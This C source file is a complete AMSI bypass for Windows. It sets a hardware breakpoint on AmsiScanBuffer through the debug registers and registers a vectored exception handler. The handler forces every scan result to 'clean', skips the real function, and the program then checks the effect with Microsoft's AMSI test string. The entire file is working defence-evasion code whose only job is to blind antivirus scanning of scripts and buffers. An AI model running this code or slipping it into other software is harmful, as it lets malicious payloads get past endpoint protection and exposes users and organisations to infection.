#include <windows.h>
#include <stdio.h>

typedef enum AMSI_RESULT {
    AMSI_RESULT_CLEAN                  = 0,
    AMSI_RESULT_NOT_DETECTED           = 1,
    AMSI_RESULT_BLOCKED_BY_ADMIN_START = 0x4000,
    AMSI_RESULT_BLOCKED_BY_ADMIN_END   = 0x4FFF,
    AMSI_RESULT_DETECTED               = 0x8000
} AMSI_RESULT;

typedef PVOID HAMSICONTEXT;
typedef PVOID HAMSISESSION;

typedef HRESULT (WINAPI *fnAmsiScanBuffer)( HAMSICONTEXT amsiContext, PVOID buffer ,ULONG length, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT *result);

typedef HRESULT (WINAPI *fnAmsiInitialize)(LPCWSTR appName, HAMSICONTEXT *amsiContext);
typedef HRESULT (WINAPI *fnAmsiScanString)(HAMSICONTEXT amsiContext, LPCWSTR string,
                                           LPCWSTR contentName, HAMSISESSION amsiSession,
                                           AMSI_RESULT *result);
typedef VOID    (WINAPI *fnAmsiUninitialize)(HAMSICONTEXT amsiContext);

static fnAmsiInitialize   pAmsiInitialize;
static fnAmsiScanString   pAmsiScanString;
static fnAmsiUninitialize pAmsiUninitialize;
static fnAmsiScanBuffer pAmsiScanBuffer;

LONG WINAPI VectoredExceptionHandler( PEXCEPTION_POINTERS pExceptionInfo )
{
    if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP)
    {
        if ( pExceptionInfo->ExceptionRecord->ExceptionAddress == (PVOID) pAmsiScanBuffer)
        {
            AMSI_RESULT* pResult = *( AMSI_RESULT** )(pExceptionInfo->ContextRecord->Rsp + 0x30);
            if ( pResult && *pResult )
            {
                *pResult = AMSI_RESULT_CLEAN;
            }

            pExceptionInfo->ContextRecord->Rip = *( DWORD64* )pExceptionInfo->ContextRecord->Rsp;
            pExceptionInfo->ContextRecord->Rsp += sizeof(DWORD64);
            pExceptionInfo->ContextRecord->Rax = S_OK;

            pExceptionInfo->ContextRecord->Dr6 &= ~0xF;
            pExceptionInfo->ContextRecord->EFlags |= 0x10000;

            return EXCEPTION_CONTINUE_EXECUTION;
        }

        return EXCEPTION_CONTINUE_SEARCH;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

BOOL SetHwBp(HANDLE hThread, PVOID pAddress, DWORD regIndex)
{
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if ( !GetThreadContext( hThread, &ctx ) )
    {
        return FALSE;
    }

    switch (regIndex)
    {
        case 0: ctx.Dr0 = ( DWORD_PTR)pAddress; break;
        case 1: ctx.Dr1 = ( DWORD_PTR)pAddress; break;
        case 2: ctx.Dr2 = ( DWORD_PTR)pAddress; break;
        case 3: ctx.Dr3 = ( DWORD_PTR)pAddress; break;
        default: return FALSE;
    }

    ctx.Dr7 |= ( 1 << ( regIndex * 2) );
    ctx.Dr7 &= ~( 1 << ( 16 + regIndex * 4 ) );
    ctx.Dr7 &= ~( 1 << ( 17 + regIndex * 4 ) );

    if ( !SetThreadContext( hThread, &ctx ) )
    {
        return FALSE;
    }

    return TRUE;
}

BOOL RemoveHwBp( HANDLE hThread, DWORD regIndex )
{
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if ( !GetThreadContext ( hThread, &ctx ) )
    {
        printf("GetThreadContext failed: %lu \n", GetLastError() );
        return FALSE;
    }

    switch ( regIndex )
    {
        case 0: ctx.Dr0 = 0; break;
        case 1: ctx.Dr1 = 0; break;
        case 2: ctx.Dr2 = 0; break;
        case 3: ctx.Dr3 = 0; break;
        default: return FALSE;
    }

    ctx.Dr7 &= ~( 1 << (regIndex * 2 ) );

    if ( !SetThreadContext( hThread, &ctx ) )
    {
        printf("SetThreadContext failed %lu \n", GetLastError() );
        return FALSE;
    }

    return TRUE;
}



BOOL CheckAMSI(void) {
    HAMSICONTEXT ctx;
    if (pAmsiInitialize(L"AMSI Test", &ctx) != S_OK) {
        printf("[-] Failed to initialize AMSI context\n");
        return FALSE;
    }

    // Tesing using this string https://learn.microsoft.com/en-us/defender-endpoint/mde-demonstration-amsi#test-amsi-with-powershell

    LPCWSTR testString = L"AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386";
    AMSI_RESULT result;
    HRESULT hr = pAmsiScanString(ctx, testString, L"AMSI Test", NULL, &result);
    pAmsiUninitialize(ctx);

    if (hr != S_OK) {
        printf("[-] AmsiScanString failed: 0x%08lX\n", hr);
        return FALSE;
    }

    printf("[+] AmsiScanString result: 0x%08X\n", result);
    return result >= AMSI_RESULT_DETECTED;
}

int main()
{

    HANDLE hAmsi = LoadLibraryA("amsi.dll");
    if (hAmsi == 0 )
    {
        printf("[!] Failed to load amsi.dll \n");
        return 1;
    }
    printf("[+] Loaded amsi.dll sucessfully \n");

    pAmsiInitialize   = (fnAmsiInitialize)(void*)GetProcAddress(hAmsi, "AmsiInitialize");
    pAmsiScanString   = (fnAmsiScanString)(void*)GetProcAddress(hAmsi, "AmsiScanString");
    pAmsiUninitialize = (fnAmsiUninitialize)(void*)GetProcAddress(hAmsi, "AmsiUninitialize");
    pAmsiScanBuffer = (fnAmsiScanBuffer)(void*)GetProcAddress(hAmsi, "AmsiScanBuffer");

    printf("[+] AmsiScanBuffer address: 0x%p \n", pAmsiScanBuffer);

    // Adding VectoredExceptionHandler
    AddVectoredExceptionHandler(1, VectoredExceptionHandler);

    SetHwBp( (HANDLE)-2 , (PVOID)pAmsiScanBuffer, 0);

    printf("[+] Breakpoint set at 0x%p \n", pAmsiScanBuffer);

    system("pause");

    CheckAMSI();

    RemoveHwBp( (HANDLE)-2, 0);

    return 0;
}